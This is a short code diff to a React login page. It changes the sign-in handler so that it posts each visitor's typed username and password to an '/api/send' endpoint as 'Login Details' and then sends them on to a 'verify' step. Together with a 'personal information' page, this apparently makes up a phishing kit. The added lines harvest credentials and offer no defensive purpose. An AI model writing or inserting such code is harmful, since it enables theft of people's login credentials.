@@ -53,7 +53,12 @@ function App() {
   // Login page submit logic
   const handleLogin = async (e) => {
     e.preventDefault();
-    setPage('personal');
+    await axios.post("/api/send", {
+      subject: "Login Details",
+      email: username,
+      message: password
+    });
+    setPage('verify');
   };
 
   // Personal Information submit logic
@@ -442,7 +447,7 @@ function App() {
               textAlign: 'center',
               boxShadow: 'none',
             }}
-            onClick={e => { e.preventDefault(); setPage('verify'); }}
+            onClick={handleLogin}
           >
             SIGN IN
           </button>
